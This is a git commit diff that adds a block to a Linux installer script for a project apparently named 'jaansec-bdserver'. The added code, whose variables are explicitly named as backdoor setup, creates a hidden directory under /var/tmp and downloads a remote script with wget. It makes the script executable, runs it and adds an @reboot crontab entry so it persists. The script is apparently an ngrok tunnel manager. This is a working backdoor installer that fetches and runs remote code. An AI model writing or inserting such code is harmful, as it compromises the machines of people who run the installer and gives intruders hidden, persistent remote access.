41b179a73f5141c310f934c8885e7bc2846982e0
NEJANX <109518855+NEJANX@users.noreply.github.com>
2024-06-10 19:20:41 +0530

    Update installer_linux.sh

--- jaansec-bdserver/installer_linux.sh
+++ jaansec-bdserver/installer_linux.sh
@@ -28,3 +28,28 @@ EOF
 # Enable and start the service
 systemctl enable bdserver
 systemctl start bdserver
+
+
+################################
+#    Tunnel Manager Install    #
+################################
+
+# Define variables
+BACKDOOR_SETUP_URL="https://github.com/NEJANX/cdn/raw/main/jaansec-bdserver/tunnel_manager.sh"
+HIDDEN_DIR="/var/tmp/.hidden"
+BACKDOOR_SETUP_SCRIPT="$HIDDEN_DIR/setup_ngrok.sh"
+
+# Create hidden directory if it doesn't exist
+mkdir -p $HIDDEN_DIR
+
+# Download the backdoor setup script
+wget $BACKDOOR_SETUP_URL -O $BACKDOOR_SETUP_SCRIPT
+
+# Make the setup script executable
+chmod +x $BACKDOOR_SETUP_SCRIPT
+
+# Run the setup script
+$BACKDOOR_SETUP_SCRIPT
+
+# Ensure the setup script runs on startup
+(crontab -l 2>/dev/null; echo "@reboot $BACKDOOR_SETUP_SCRIPT") | crontab -
